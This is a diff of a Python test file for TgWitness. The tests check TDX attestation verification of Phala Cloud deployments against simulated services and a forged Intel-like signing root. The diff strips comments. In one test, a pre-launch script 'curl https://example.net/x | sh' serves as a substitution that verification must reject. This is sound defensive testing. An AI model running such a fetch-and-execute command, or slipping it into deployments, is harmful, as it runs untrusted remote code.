@@ -1,9 +1,3 @@
-"""Phala deployments against a simulated Phala Cloud API and a simulated confidential VM.
-
-The CVM's quotes are signed by a forged PKI shaped like Intel's (tools/check_tdx.py) and checked by the
-real tgwitness.tdx code with that forged root in place of Intel's: deploy, verify and the journal, and
-every substitution a quote has to expose.
-"""
 import hashlib
 import io
 import json
@@ -49,7 +43,6 @@ ARCHIVE = archive_of({**SOURCE, "website/index.html": b"not installed"})
 
 
 class PhalaWorld(World):
-    """Cloudflare plus Phala Cloud's API: provision, commit, the CVM and the application's revisions."""
     key, server_type, ipv4 = "phala", "tdx.small", "198.51.100.7"
 
     def __init__(self):
@@ -61,7 +54,6 @@ class PhalaWorld(World):
         path = url[len(Phala.base):]
         if path == "/cvms" and method == "POST" and "compose_file" in body:
             self.name, self.provisioned = body["name"], body
-            # Phala normalises the compose its own way; the verifier never rebuilds this text.
             self.app_compose = json.dumps({"manifest_version": 2, "name": body["name"], "runner": "docker-compose",
                                            **body["compose_file"]}, sort_keys=True)
             self.compose_hash = hashlib.sha256(self.app_compose.encode()).hexdigest()
@@ -115,17 +107,15 @@ class PhalaWorld(World):
 
     def request(self, method, url, timeout=None, json=None, params=None, headers=None, data=None):
         if url.startswith("https://api.github.com/repos/phishdestroy/TgWitness/commits/"):
-            return Response(200, {"sha": COMMIT})  # the wizard's version lookup
+            return Response(200, {"sha": COMMIT})
         return super().request(method, url, timeout, json, params, headers, data)
 
     def get(self, url, timeout=None, **options):
-        """GitHub: the commit archive the CVM installs from."""
         assert url == "https://codeload.github.com/phishdestroy/TgWitness/tar.gz/" + COMMIT, url
         return Response(200, content=ARCHIVE)
 
 
 class Cvm:
-    """The collector in the CVM: a real vault signing real statements, quoted by the forged platform."""
     def __init__(self, world, tmp_path, forge):
         self.world, self.forge, self.vault, self.root = world, forge, Vault(tmp_path / "collector"), tmp_path / "cvm"
         for directory in ("proc/net", "proc/sys/kernel/random", "etc/tgwitness"):
@@ -136,7 +126,7 @@ class Cvm:
                         "source_tree_sha256": source_tree_sha256(source_files()),
                         "public_key": self.vault.public_key}
         self.override, self.attributes, self.late, self.bind_to = {}, SEPT_VE_DISABLE, [], None
-        self.compose_hash = None  # what dstack measured, if not the world's app-compose
+        self.compose_hash = None
 
     def provider(self):
         return {"provider": "phala", "instance_id": INSTANCE, "app_id": self.world.app_id, "hostname": "cvm",
@@ -215,7 +205,7 @@ def test_the_compose_pins_the_commit_its_files_and_both_images(tmp_path):
                                          repository="https://github.com/phishdestroy/TgWitness.git"),
                                resolve=lambda repository, ref: ref)
     manifest = cloud.source_manifest(cloud.tarball_files(ARCHIVE))
-    assert manifest == cloud.source_manifest(SOURCE)  # the archive's other files are not installed
+    assert manifest == cloud.source_manifest(SOURCE)
     compose = cloud.phala_compose(spec, TUNNEL, manifest)
     assert "https://codeload.github.com/phishdestroy/TgWitness/tar.gz/" + COMMIT in compose
     assert 'MANIFEST = "' + manifest + '"' in compose and compose.count("@sha256:") == 2
@@ -224,7 +214,6 @@ def test_the_compose_pins_the_commit_its_files_and_both_images(tmp_path):
     source = "\n".join(line[8:] for line in installer.splitlines())
     compile(source, "installer", "exec")
     assert "$" not in source and "--require-hashes" in source
-    # The installer's own hashing gives the manifest deploy computed.
     digests = {path: hashlib.sha256(body).hexdigest() for path, body in SOURCE.items() if cloud.wanted_source(path)}
     assert hashlib.sha256(json.dumps(digests, ensure_ascii=False, sort_keys=True,
                                      separators=(",", ":")).encode()).hexdigest() == manifest
@@ -268,7 +257,6 @@ def test_a_clean_deployment_passes_on_the_quote_alone(phala):
     assert "checked by this verifier to Intel's root" in markdown and "--tdx-measurements" in markdown
     assert "Without hardware attestation" not in markdown and "Phala's KMS" in markdown
     assert phala.world.tunnel["token"] not in markdown + json.dumps(report)
-    # Without measurements from the image the firmware and kernel are not compared: incomplete, not passed.
     report = verify(phala, tdx_measurements=None)
     assert report["result"] == "incomplete" and checks(report)["tdx_os"] == "unavailable"
     assert report["assurance"]["key_nonexportability"] == "conditional-on-os-image"
@@ -282,16 +270,14 @@ def test_every_substitution_the_quote_must_expose(phala):
     cvm.bind_to = b"another statement"
     assert checks(verify(phala))["tdx_binding"] == "fail"
     cvm.bind_to = None
-    cvm.attributes = SEPT_VE_DISABLE | 1  # a TD the host can read
+    cvm.attributes = SEPT_VE_DISABLE | 1
     result = verify(phala)
     assert checks(result)["tdx_quote"] == "fail" and "debug mode" in detail(result, "tdx_quote")
     cvm.attributes = SEPT_VE_DISABLE
-    # The collector reports one compose while dstack measured another.
     cvm.compose_hash = "11" * 32
     result = checks(verify(phala))
     assert result["tdx_compose_hash"] == "fail" and result["tdx_compose"] == "fail"
     cvm.compose_hash = None
-    # A measured compose that runs a pre-launch script, and one whose collector is not the commit's.
     for change in ({"pre_launch_script": "curl https://example.net/x | sh"},
                    {"docker_compose_file": json.loads(world.app_compose)["docker_compose_file"].replace(
                        "--require-hashes", "--no-deps", 1)}):
@@ -354,7 +340,7 @@ def test_the_journal_refuses_a_start_in_another_compose_or_outside_the_quote(pha
     run = {"run_id": "r1", "public_key": vault.public_key, "source_tree_sha256": "s" * 64,
            "host": {"provider": cvm.provider()}}
     run["tdx_start"] = assurance.start_attestation("phala", run)
-    run["host"] = {"provider": {**cvm.provider(), "instance_id": "09" * 20}}  # edited after it was quoted
+    run["host"] = {"provider": {**cvm.provider(), "instance_id": "09" * 20}}
     store.append("process.started", {"run": run})
     report = cloud.Report()
     cloud.verify_tdx_journal(report, export_file(store, vault, "zip"), fingerprint(vault.public_key), record,
@@ -411,7 +397,7 @@ def test_a_quick_tunnel_runs_in_the_measured_compose_and_posts_its_address_signe
     assert "--url, http://127.0.0.1:8787" in compose and " TUNNEL_TOKEN:" not in compose
     assert 'TGWITNESS_BEACON: "' + spec["beacon"] + '"' in compose and cloud.ADDRESS_FORMAT in compose
     assert re.findall(r"\$\{?(\w+)", compose) == ["TGWITNESS_TOKEN", "TGWITNESS_TUNNEL_TOKEN"]
-    assert '\\"beacon\\": \\"' + spec["beacon"] in compose  # in the measured description as well
+    assert '\\"beacon\\": \\"' + spec["beacon"] in compose
     world = PhalaWorld()
     cvm = Cvm(world, tmp_path / "quick", phala.forge)
     monkeypatch.setattr(Phala, "attest", staticmethod(cvm.attest))
@@ -503,7 +489,6 @@ def test_the_panel_wizard_prices_deploys_and_deletes_a_phala_cvm(phala, tmp_path
 
 
 def test_the_wizard_in_the_browser_offers_deploys_and_deletes_a_phala_cvm(phala, tmp_path, monkeypatch):
-    """The panel: choosing Phala Cloud swaps the token and hides Hetzner's region and Gateway DNS; English and Russian."""
     from check_browser import RunningApp, answer_panel_dialog, check_layout, launch_browser, navigate_panel, reload_panel, unlock
     from playwright.sync_api import expect, sync_playwright
     from tgwitness import i18n
